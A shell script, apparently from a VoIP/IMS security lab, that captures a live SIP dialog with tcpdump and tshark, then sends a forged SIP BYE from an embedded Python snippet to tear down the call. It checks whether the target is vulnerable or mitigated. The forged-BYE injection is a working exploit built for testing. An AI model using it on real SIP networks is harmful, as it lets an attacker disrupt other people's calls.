#!/bin/sh
# ============================================================================
# v7_cierre.sh - V7: BYE forjado con captura en dos fases.
# Uso: ./vectores/v7_cierre.sh vuln|mit
# Requiere lab UP, contenedor kali y una llamada 1001->1000 por iniciar.
# La fase 1 captura el dialogo; la fase 2 captura el BYE y su respuesta.
# ============================================================================
set -eu
cd "$(dirname "$0")/.."
export MSYS_NO_PATHCONV=1

MODE="${1:-vuln}"
case "$MODE" in vuln|mit) ;; *) echo "uso: $0 vuln|mit" >&2; exit 2 ;; esac

SRCU="${SRCU:-1001}"
DSTU="${DSTU:-1000}"
DOMAIN="${DOMAIN:-ims.mnc070.mcc999.3gppnetwork.org}"
PCSCF_IP="${PCSCF_IP:-172.20.0.6}"
PCSCF_PORT="${PCSCF_PORT:-4060}"
TS=$(date -u +%Y%m%dT%H%M%SZ)
OUT="results/v7_d3"
mkdir -p "$OUT"

log() { echo "[v7-$MODE] $*"; }

docker ps --format "{{.Names}}" 2>/dev/null | tr -d '\r' | grep -qx kali \
  || { log "ERROR: kali no corre (docker compose up -d kali)"; exit 1; }
docker ps --format "{{.Names}}" 2>/dev/null | tr -d '\r' | grep -qx kamailio \
  || { log "ERROR: kamailio no corre"; exit 1; }

start_call() {
  docker exec srsue pkill -x baresip >/dev/null 2>&1 || true
  sleep 1
  docker exec -d srsue sh -c "export HOME=/root; baresip -f /root/.baresip -e '/dial $DSTU@$DOMAIN' > /tmp/baresip_v7.log 2>&1"
  i=0
  while [ "$i" -lt 25 ]; do
    n=$(docker exec asterisk asterisk -rx "core show channels" 2>/dev/null | grep -a -c PJSIP || true)
    [ "${n:-0}" -ge 1 ] && { log "llamada activa (PJSIP=$n)"; return 0; }
    sleep 1; i=$((i + 1))
  done
  log "ERROR: no se establecio la llamada"
  return 1
}

channels() {
  docker exec asterisk asterisk -rx "core show channels" 2>/dev/null | grep -a -c PJSIP || true
}

# --- Fase 1: capturar dialogo ---
docker exec kamailio sh -c "rm -f /tmp/v7_dialog.pcap"
docker exec -d kamailio sh -c "timeout 22 tcpdump -i any -s0 -w /tmp/v7_dialog.pcap 'udp port 4060 or udp port 6060' > /tmp/v7_dialog.log 2>&1"
sleep 2
start_call || exit 1
sleep 10
docker cp kamailio:/tmp/v7_dialog.pcap "$OUT/v7_${MODE}_dialog_$TS.pcap" >/dev/null
log "dialogo capturado: $OUT/v7_${MODE}_dialog_$TS.pcap"

# Extraer dialogo en kali
INV=$(docker exec kali tshark -r "/root/results/v7_d3/v7_${MODE}_dialog_$TS.pcap" \
  -Y "sip.Method == \"INVITE\" && sip.from.user == \"$SRCU\"" \
  -T fields -e sip.Call-ID -e sip.from.tag -e sip.CSeq 2>/dev/null | head -n 1 | tr -d '\r')
CALLID=$(echo "$INV" | cut -f1)
FROMTAG=$(echo "$INV" | cut -f2)
INVCSEQ=$(echo "$INV" | cut -f3 | cut -d' ' -f1)
CSEQ=$((INVCSEQ + 1))
OK=$(docker exec kali tshark -r "/root/results/v7_d3/v7_${MODE}_dialog_$TS.pcap" \
  -Y "sip.Status-Code == 200 && sip.CSeq.method == \"INVITE\" && sip.Call-ID == \"$CALLID\"" \
  -T fields -e sip.to.tag -e sip.Contact 2>/dev/null | head -n 1 | tr -d '\r')
TOTAG=$(echo "$OK" | cut -f1)
RURI=$(echo "$OK" | cut -f2- | tr -d '<>' | sed 's/[[:space:]].*//; s/;.*//')
[ -n "$CALLID" ] && [ -n "$FROMTAG" ] && [ -n "$TOTAG" ] && [ -n "$RURI" ] \
  || { log "ERROR: no se pudo extraer Call-ID/tags/Contact"; ch=$(channels); log "PJSIP=$ch"; exit 1; }
log "dialogo: Call-ID=$CALLID From-tag=$FROMTAG To-tag=$TOTAG CSeq=$CSEQ RURI=$RURI"

BEFORE=$(channels)
log "PJSIP antes del BYE: $BEFORE"

# --- Fase 2: capturar el ataque (BYE + respuesta) ---
docker exec kamailio sh -c "rm -f /tmp/v7_attack.pcap"
docker exec -d kamailio sh -c "timeout 20 tcpdump -i any -s0 -w /tmp/v7_attack.pcap 'udp port 4060 or udp port 6060' > /tmp/v7_attack.log 2>&1"
sleep 2
docker exec -e CALLID="$CALLID" -e FROMTAG="$FROMTAG" -e TOTAG="$TOTAG" -e CSEQ="$CSEQ" \
  -e SRCU="$SRCU" -e DSTU="$DSTU" -e DOMAIN="$DOMAIN" -e PCSCF_IP="$PCSCF_IP" \
  -e PCSCF_PORT="$PCSCF_PORT" -e RURI="$RURI" \
  kali python3 -c "
import os, socket, time
callid=os.environ['CALLID']; ftag=os.environ['FROMTAG']; ttag=os.environ['TOTAG']
cseq=os.environ['CSEQ']; src=os.environ['SRCU']; dst=os.environ['DSTU']
dom=os.environ['DOMAIN']; tgt=os.environ['PCSCF_IP']; port=int(os.environ['PCSCF_PORT'])
ruri=os.environ['RURI']; branch='z9hG4bKv7%x' % int(time.time())
bye=('BYE %s SIP/2.0\r\n'
 'Via: SIP/2.0/UDP 172.20.0.99:5060;branch=%s\r\n'
 'Max-Forwards: 70\r\n'
 'Route: <sip:%s:%d;lr>\r\n'
 'From: <sip:%s@%s>;tag=%s\r\n'
 'To: <sip:%s@%s>;tag=%s\r\n'
 'Call-ID: %s\r\n'
 'CSeq: %s BYE\r\n'
 'Content-Length: 0\r\n\r\n') % (ruri, branch, tgt, port, src, dom, ftag, dst, dom, ttag, callid, cseq)
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
for _ in range(3):
    s.sendto(bye.encode(), (tgt, port)); time.sleep(0.3)
print('BYE enviado', ruri, 'CSeq', cseq)
"
sleep 8
AFTER=$(channels)
# esperar el cierre limpio del timeout de tcpdump
sleep 13
docker cp kamailio:/tmp/v7_attack.pcap "$OUT/v7_${MODE}_attack_$TS.pcap" >/dev/null
log "ataque capturado: $OUT/v7_${MODE}_attack_$TS.pcap (PJSIP $BEFORE -> $AFTER)"

BYES=$(docker exec kali tshark -r "/root/results/v7_d3/v7_${MODE}_attack_$TS.pcap" -Y 'sip.Method == "BYE"' 2>/dev/null | wc -l || true)
BYEOK=$(docker exec kali tshark -r "/root/results/v7_d3/v7_${MODE}_attack_$TS.pcap" -Y 'sip.CSeq.method == "BYE" && sip.Status-Code == 200' 2>/dev/null | wc -l || true)
BYEERR=$(docker exec kali tshark -r "/root/results/v7_d3/v7_${MODE}_attack_$TS.pcap" -Y 'sip.CSeq.method == "BYE" && (sip.Status-Code == 403 || sip.Status-Code == 481)' 2>/dev/null | wc -l || true)

{
  echo "mode=$MODE"
  echo "timestamp=$TS"
  echo "call_id=$CALLID"
  echo "from_tag=$FROMTAG"
  echo "to_tag=$TOTAG"
  echo "cseq=$CSEQ"
  echo "ruri=$RURI"
  echo "channels_before=$BEFORE"
  echo "channels_after=$AFTER"
  echo "bye_packets=$BYES"
  echo "bye_200=$BYEOK"
  echo "bye_403_481=$BYEERR"
} > "$OUT/v7_${MODE}_metrics_$TS.txt"

docker exec srsue pkill -x baresip >/dev/null 2>&1 || true

log "BYEs=$BYES 200-al-BYE=$BYEOK 403/481-al-BYE=$BYEERR"
if [ "${BYES:-0}" -lt 1 ]; then
  log "ERROR: el BYE no quedo en el pcap; evidencia invalida"
  exit 1
fi
if [ "$MODE" = "vuln" ]; then
  [ "${BYEOK:-0}" -ge 1 ] && [ "$AFTER" = "0" ] && [ "$BEFORE" != "0" ] \
    && { log "VEREDICTO: VULNERABLE (BYE en pcap + 200 + llamada 1->0)"; exit 0; }
  log "ERROR: no se cumplio el veredicto vulnerable"; exit 1
else
  [ "${BYEERR:-0}" -ge 1 ] && [ "$AFTER" != "0" ] \
    && { log "VEREDICTO: MITIGADO (BYE en pcap + 403/481 + llamada sigue)"; exit 0; }
  log "ERROR: no se cumplio el veredicto mitigado"; exit 1
fi
